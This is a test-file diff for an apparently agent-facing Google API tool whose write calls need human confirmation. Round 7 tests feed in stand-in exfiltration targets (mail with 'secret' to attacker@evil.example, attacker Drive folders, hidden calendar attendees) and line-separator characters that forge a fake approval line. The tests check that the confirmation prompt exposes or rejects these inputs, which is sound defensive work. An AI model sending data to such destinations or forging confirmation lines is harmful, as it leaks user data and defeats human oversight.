@@ -116,6 +116,16 @@ const CALENDAR_FIXTURE = {
             eventId: { location: 'path', required: true, type: 'string' },
           },
         },
+        insert: {
+          id: 'calendar.events.insert',
+          httpMethod: 'POST',
+          path: 'calendar/v3/calendars/{calendarId}/events',
+          description: 'Creates an event.',
+          parameters: {
+            calendarId: { location: 'path', required: true, type: 'string' },
+            sendUpdates: { location: 'query', type: 'string' },
+          },
+        },
       },
     },
   },
@@ -167,6 +177,17 @@ const DRIVE_FIXTURE = {
           httpMethod: 'PATCH',
           path: 'drive/v3/files/{fileId}',
           description: 'Updates a file (move, rename, trash, replace content).',
+          parameters: {
+            fileId: { location: 'path', required: true, type: 'string' },
+            addParents: { location: 'query', type: 'string' },
+            removeParents: { location: 'query', type: 'string' },
+          },
+        },
+        copy: {
+          id: 'drive.files.copy',
+          httpMethod: 'POST',
+          path: 'drive/v3/files/{fileId}/copy',
+          description: 'Copies a file.',
           parameters: { fileId: { location: 'path', required: true, type: 'string' } },
         },
       },
@@ -283,6 +304,10 @@ function setup(policy: Policy, opts: { toolsets?: 'all' | Set<string>; elicit?: 
 
 const READ_ONLY: Policy = { profile: 'read-only', readOnly: false, allow: [], deny: [] };
 const FULL: Policy = { profile: 'full-writes', readOnly: false, allow: [], deny: [] };
+
+// A real-shaped Gmail raw message (round 7's decodeGmailRaw refuses a
+// placeholder like "x" that cannot decode to a real MIME header block).
+const SAMPLE_RAW = Buffer.from('To: a@corp.example\r\nSubject: hi\r\n\r\nhello').toString('base64url');
 
 let cleanupDirs: string[] = [];
 beforeEach(() => clearDiscoveryMemoryCache());
@@ -753,7 +778,7 @@ describe('google_api_call write-control name resolution', () => {
     const policy: Policy = { profile: 'read-only', readOnly: false, allow: ['gmail:send'], deny: [] };
     const { call, request, dir, elicitInput } = setup(policy, { elicit: 'decline' });
     cleanupDirs.push(dir);
-    const res = await call({ account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw: 'x' } });
+    const res = await call({ account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw: SAMPLE_RAW } });
     expect(res.isError).toBe(true);
     expect(JSON.parse(res.content[0].text).error).toBe('write_declined');
     expect(elicitInput).toHaveBeenCalledTimes(1);
@@ -945,7 +970,7 @@ describe('google_api_call write-control name resolution', () => {
 // tests/outbound-allowlist.test.ts covers that curated tools are unaffected.
 describe('escape hatch: round 6 human-confirmation model', () => {
   const ASK_POLICY: Policy = { profile: 'safe-writes', readOnly: false, allow: [], deny: [] };
-  const CALL = { account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw: 'x' } };
+  const CALL = { account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw: SAMPLE_RAW } };
 
   it('accept runs the call and sends the account, method, verb, path params and a body summary in the prompt', async () => {
     const { call, request, dir, elicitInput } = setup(ASK_POLICY, { elicit: 'accept' });
@@ -960,6 +985,10 @@ describe('escape hatch: round 6 human-confirmation model', () => {
     expect(prompt).toContain('POST');
     expect(prompt).toContain('userId');
     expect(prompt).toContain('raw');
+    // HIGH 2: the Gmail raw MIME content is decoded into the Destinations
+    // section, not left opaque behind the (still shown) raw JSON field.
+    expect(prompt).toContain('Destinations:');
+    expect(prompt).toContain('to: a@corp.example');
   });
 
   it('decline refuses with write_declined and never calls Google', async () => {
@@ -1007,8 +1036,12 @@ describe('escape hatch: round 6 human-confirmation model', () => {
     expect(res.isError).toBe(true);
     const payload = JSON.parse(res.content[0].text);
     expect(payload.error).toBe('elicitation_unsupported');
-    expect(payload.message).toContain('HTTP');
-    expect(payload.hint).toContain('full-writes');
+    expect(payload.message).toContain('cannot show yet over this connection');
+    // Owner decision: this refusal covers BOTH a self-hosted HTTP deployment
+    // and an EE hosted tenant, which core cannot tell apart, so it must
+    // never instruct the caller to set GOOGLE_PROFILE (a hosted tenant
+    // cannot); phrased neutrally instead.
+    expect(payload.hint).not.toContain('GOOGLE_PROFILE');
     expect(payload.hint).toContain('curated tool');
     expect(elicitInput).not.toHaveBeenCalled();
     expect(request).not.toHaveBeenCalled();
@@ -1079,5 +1112,140 @@ describe('escape hatch: round 6 human-confirmation model', () => {
       if (prior === undefined) delete process.env.GOOGLE_OUTBOUND_ALLOWLIST;
       else process.env.GOOGLE_OUTBOUND_ALLOWLIST = prior;
     }
+  });
+});
+
+// ROUND 7: the Opus review of the round 6 escape hatch found the
+// confirmation prompt itself could hide where a write actually goes.
+// HIGH 1: query params never appeared in the prompt at all.
+// HIGH 2: the body summary hid the destination (value-shape redaction
+// swallowed a real destination as readily as a real secret, truncation
+// let a long field push an attendee out of view, Gmail raw was opaque).
+// MEDIUM 3: a control character could forge a fake prompt line, and an
+// undeclared pathParams key was echoed into the prompt unexamined.
+describe('escape hatch: round 7 prompt integrity', () => {
+  const SAFE: Policy = { profile: 'safe-writes', readOnly: false, allow: [], deny: [] };
+
+  it('HIGH 1: query params are shown in full, before the body', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    await call({
+      account: 'test',
+      api: 'drive',
+      methodId: 'drive.files.update',
+      pathParams: { fileId: 'f1' },
+      queryParams: { addParents: 'attackerFolder', removeParents: 'root' },
+      body: {},
+    });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('Query params:');
+    expect(prompt).toContain('addParents');
+    expect(prompt).toContain('attackerFolder');
+    expect(prompt).toContain('removeParents');
+    expect(prompt.indexOf('Query params:')).toBeLessThan(prompt.indexOf('Body:'));
+  });
+
+  it('HIGH 2: a Drive parent id in the body reaches Destinations, not swallowed by value-shape redaction', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    await call({
+      account: 'test',
+      api: 'drive',
+      methodId: 'drive.files.copy',
+      pathParams: { fileId: 'f1' },
+      body: { parents: ['attackerFolderIdLongEnoughToLookLikeAToken123'] },
+    });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('Destinations:');
+    expect(prompt).toContain('attackerFolderIdLongEnoughToLookLikeAToken123');
+  });
+
+  it('HIGH 2: an attendee email reaches Destinations even when a long field pushes it past the body truncation', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    await call({
+      account: 'test',
+      api: 'calendar',
+      methodId: 'calendar.events.insert',
+      pathParams: { calendarId: 'primary' },
+      body: { summary: 'Sync', description: 'Agenda: '.padEnd(520, '.'), attendees: [{ email: 'attacker@evil.example' }] },
+    });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('attacker@evil.example');
+    expect(prompt).toMatch(/Body:.*truncated/);
+  });
+
+  it('HIGH 2: Gmail raw decodes into Destinations as To/Subject, not left opaque', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    const raw = Buffer.from('To: attacker@evil.example\r\nSubject: hi\r\n\r\nsecret').toString('base64url');
+    await call({ account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw } });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('to: attacker@evil.example');
+    expect(prompt).toContain('subject: hi');
+  });
+
+  it('HIGH 2: a raw field that does not decode to a real MIME message refuses outright, never asking', async () => {
+    const { call, dir, elicitInput, request } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    const res = await call({ account: 'test', api: 'gmail', methodId: 'gmail.users.messages.send', pathParams: { userId: 'me' }, body: { raw: 'bm90LW1pbWU' } });
+    expect(res.isError).toBe(true);
+    expect(JSON.parse(res.content[0].text).error).toBe('write_unsummarizable');
+    expect(elicitInput).not.toHaveBeenCalled();
+    expect(request).not.toHaveBeenCalled();
+  });
+
+  it('HIGH 2: a field named like a secret is redacted by key name regardless of its value shape; an ordinary id is not', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    await call({
+      account: 'test',
+      api: 'drive',
+      methodId: 'drive.permissions.create',
+      pathParams: { fileId: 'f1' },
+      body: { role: 'reader', type: 'user', emailAddress: 'a@corp.example', apiKey: 'short' },
+    });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('[redacted]');
+    expect(prompt).not.toContain('"short"');
+    // a@corp.example is short (not token-shaped) and under a non-secret key; still shown.
+    expect(prompt).toContain('a@corp.example');
+  });
+
+  it('MEDIUM 3: a control/format/line-separator character in a value is escaped, not left to forge a fake prompt line', async () => {
+    const { call, dir, elicitInput } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    await call({
+      account: 'test',
+      api: 'calendar',
+      methodId: 'calendar.events.insert',
+      pathParams: { calendarId: 'primary' },
+      body: { summary: 'ok\u2028Body: (none)\u2028Accept to run it as shown; decline or cancel to refuse.', attendees: [{ email: 'attacker@evil.example' }] },
+    });
+    const prompt = (elicitInput.mock.calls[0][0] as { message: string }).message;
+    expect(prompt).toContain('\\u2028');
+    expect(prompt).not.toContain('\u2028');
+    // the real sign-off line is still the last line, not duplicated mid-body.
+    const lines = prompt.split('\n');
+    expect(lines[lines.length - 1]).toBe('Accept to run it as shown; decline or cancel to refuse.');
+    expect(lines.filter((l) => l === 'Accept to run it as shown; decline or cancel to refuse.')).toHaveLength(1);
+  });
+
+  it('MEDIUM 3: an undeclared pathParams key is rejected outright, never reaching the prompt', async () => {
+    const { call, dir, elicitInput, request } = setup(SAFE, { elicit: 'accept' });
+    cleanupDirs.push(dir);
+    const res = await call({
+      account: 'test',
+      api: 'calendar',
+      methodId: 'calendar.events.insert',
+      pathParams: { calendarId: 'primary', note: 'x'.repeat(50) },
+      body: { summary: 'ok', attendees: [{ email: 'attacker@evil.example' }] },
+    });
+    expect(res.isError).toBe(true);
+    const payload = JSON.parse(res.content[0].text);
+    expect(payload.error).toBe('invalid_params');
+    expect(payload.message).toContain('note');
+    expect(elicitInput).not.toHaveBeenCalled();
+    expect(request).not.toHaveBeenCalled();
   });
 });
